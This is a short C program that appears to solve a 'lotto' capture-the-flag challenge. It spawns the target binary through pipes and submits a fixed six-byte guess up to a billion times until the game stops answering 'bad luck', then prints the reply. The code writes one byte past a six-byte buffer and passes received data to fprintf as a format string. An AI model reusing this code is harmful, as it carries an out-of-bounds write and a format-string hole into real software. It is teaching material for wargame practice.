#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define ATTEMPTS 1000000000

const char* welcome = "- Select Menu -\n1. Play Lotto\n2. Help\n3. Exit\n";


const char* submit = "Submit your 6 lotto bytes : ";
const char* lottostart = "Lotto Start!\n";
const char* badluck = "bad luck...\n";

void play(int fout, int fin)
{
    int played = 0;
    int welcome_len = strlen(welcome); 
    int submit_len = strlen(submit);
    int lotto_start_len = strlen(lottostart);
    int badluck_len = strlen(badluck);
    char sel[2];
    sel[0] = '1';
    sel[1] = '\n';
    char buff[6];
    char received[1024];
    memset(received, 0 , sizeof(received));
    memset(buff, 0, sizeof(buff));
    buff[0] = '\x12';
    buff[1] = '\x06';
    buff[2] = '\x08';
    buff[3] = '\x21';
    buff[4] = '\x27';
    buff[5] = '\x02';
    buff[6] = '\n';

    while(played < ATTEMPTS) {
//        fprintf(stderr, "\n///////////////////////////////////\n");
        write(fout, sel, 2);
        memset(received, 0 , sizeof(received));
        read(fin, received, 1023);
        if(played >= 1) {
            if(memcmp("bad", received+lotto_start_len, 3)) {
                //fprintf(stderr, "OK\n");
                fprintf(stderr, received);
                return;
            }
        }
        //fprintf(stderr, "%s", received);
        write(fout, buff, 6);
        played++;
    }

}

int main(int argc, char* argv[])
{
    
    int fd[2];
    int fd_out[2];
    if(pipe(fd)) {
        perror("pipe error in exploit");
        exit(1);
    }
    if(pipe(fd_out)) {
        perror("pipe error in exploit");
        exit(1);
    }
 
    switch(fork()) {
        case -1:
            perror("fork failed in exploit");
            exit(1);
            break;
        case 0:
            // child
            close(fd[1]); close(fd_out[0]);
            dup2(fd[0], STDIN_FILENO); 
            dup2(fd_out[1], STDOUT_FILENO); 
            close(fd[0]); close(fd_out[1]);

            execv(argv[1], NULL);
        default:
            // parent
            close(fd[0]);
            close(fd_out[1]);
            play(fd[1], fd_out[0]);
            close(fd[1]);
            close(fd_out[0]);
    }

    return 0;
}

